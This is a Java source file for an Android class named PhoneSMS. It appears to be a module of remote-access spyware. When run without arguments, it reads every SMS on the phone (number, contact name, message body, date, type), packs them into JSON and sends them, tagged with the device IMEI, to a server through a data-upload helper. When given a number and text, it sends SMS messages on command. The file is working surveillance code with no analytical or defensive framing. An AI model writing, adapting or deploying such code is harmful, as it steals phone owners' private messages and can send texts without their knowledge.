package com.phone.data;


import java.util.List;
import org.json.JSONArray;
import org.json.JSONObject;
import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;
import android.util.Log;
import com.authority.AuthoritySettings;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;





public class PhoneSMS implements Runnable{
	private static final String TAG = "PhoneSMS";
	private Context context;
	private String phoneNumber = null;
	private String message = null;
	
	 public PhoneSMS(Context context) {
		 this.context = context;
	}
	 
	public PhoneSMS(Context context,String phoneNo,String message){
		this.context = context;
		this.phoneNumber = phoneNo;
		this.message = message;
	}
	 
	public  void run( ) {
		if (phoneNumber != null && message != null) {
			sendShortMessage(context,phoneNumber,message);
		}else{
			String sms = getSmsFromPhone(context);
			SendDataToServer.sendDataToServer(sms.getBytes(), sms.getBytes().length, 
					Public.CMD_DATA_MESSAGE, Public.IMEI);
		}
	}
	
	public static String getSmsFromPhone(Context context) {
		JSONArray jsarray = new JSONArray();
		
		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.READ_SMS) == false){
			return jsarray.toString();
		}
		
		try{
			ContentResolver cr = context.getContentResolver();  
			String[] projection = new String[] {"_id", "address", "person","body", "date", "type"};
			Cursor cur = cr.query(Uri.parse("content://sms/"), projection, null, null, "date desc");
			if (null == cur){
				return jsarray.toString();
			}
			int i = 0;
			for(cur.moveToFirst();!cur.isAfterLast() ; cur.moveToNext()){
				String id = cur.getString(cur.getColumnIndex("_id"));
				String address = cur.getString(cur.getColumnIndex("address"));
				String person = cur.getString(cur.getColumnIndex("person"));
				String body = cur.getString(cur.getColumnIndex("body"));
				String date = cur.getString(cur.getColumnIndex("date"));
				String type = cur.getString(cur.getColumnIndex("type"));
				
				String strdate = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss", Long.parseLong(date));			
				JSONObject jsobj=new JSONObject();
    	   	  	jsobj.put("ID", id);
    	   	  	jsobj.put("号码", address);
    	   	  	jsobj.put("名称", person);
    	   	  	jsobj.put("消息内容", body);
    	   	  	jsobj.put("时间", strdate);
    	   	  	jsobj.put("类型", type);
    	   	  	jsarray.put(i,jsobj);
				i ++;
			}
			cur.close();
		}
		catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getSmsFromPhone exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}
		return jsarray.toString();
	}
	
	

    public static void sendShortMessage(Context context,String phoneNumber, String message) {
    	try{
    		if (AuthoritySettings.checkSinglePermission(context, android.Manifest.permission.SEND_SMS) == false){
    			return ;
    		}
    		
	        SmsManager smsManager = SmsManager.getDefault();

	        PendingIntent sentIntent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
	        if (message.length() > 70) {
	            List<String> msgs = smsManager.divideMessage(message);
	            for (String msg : msgs) {
	                smsManager.sendTextMessage(phoneNumber, null, msg, sentIntent, null);                        
	            }
	        } 
	        else {
	            smsManager.sendTextMessage(phoneNumber, null, message, sentIntent, null);
	        }
	        
	        Log.e(TAG, "send short message:" + phoneNumber + " ok");
	        WriteDateFile.writeLogFile("send short message:" + phoneNumber + " ok\r\n");
    	}catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("sendShortMessage exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
    	}
    }
	
	

}
